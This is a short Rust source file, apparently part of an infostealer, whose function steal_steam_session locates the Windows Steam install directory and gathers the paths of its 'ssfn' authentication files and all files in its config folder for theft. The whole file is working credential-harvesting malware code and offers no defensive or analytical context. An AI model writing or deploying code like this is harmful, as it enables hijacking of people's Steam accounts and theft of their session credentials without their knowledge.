use walkdir::WalkDir;
use std::path::Path;

pub fn steal_steam_session() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let mut path = Path::new("C:\\Program Files (x86)\\Steam\\");
    if !path.exists() {
        return Vec::new()
    }
    for entry in WalkDir::new(&path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
        if entry.file_name().to_str().map(|s| s.starts_with("ssfn")).unwrap() {
            paths.push(entry.path().to_string_lossy().to_string());
        }
    }
    let binding = path.join("config");
    path = &binding;
    if !path.exists() {
        return Vec::new();
    }
    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
        if entry.path().is_file() {
            paths.push(entry.path().to_string_lossy().to_string());
        }
    }
    paths
}